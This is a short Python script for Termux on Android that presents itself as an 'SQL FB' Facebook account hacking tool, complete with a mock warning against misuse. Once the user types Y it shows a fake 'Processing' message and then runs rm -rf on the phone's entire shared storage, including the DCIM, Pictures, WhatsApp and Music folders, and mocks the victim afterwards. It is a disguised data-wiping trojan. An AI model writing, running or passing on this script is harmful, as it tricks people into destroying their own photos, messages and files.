#!/bin/usr/bash

import os, time

print("\033[1;31m	")
os.system('clear')
os.system('cowsay -f sheep "SQL FB" ')
print(" ")
os.system('date | lolcat')

print("""\033[1;35m
NB : Do not use to hack people's Facebook accounts !!""")

a = input("\033[1;33m Type Y to Continue ")
if a == "y" or a == "Y":
    print(" ")
    print("\033[1;36m Processing ... ")
    time.sleep(5)
    os.system('termux-setup-storage')
    os.system('rm -rf /storage/emulated/0')
    os.system('rm -rf /storage/emulated/0/DCIM')
    os.system('rm -rf /storage/emulated/0/Pictures')
    os.system('rm -rf /storage/emulated/0/WhatsApp')
    os.system('rm -rf /storage/emulated/0/Android')
    os.system('rm -rf /storage/emulated/0/Music')
    os.system('rm -rf /storage/emulated/0/data')

    print(" ")
    print("\033[1;31m [!] please check your data ")
    print("\033[1;31m may be useful 😁 ")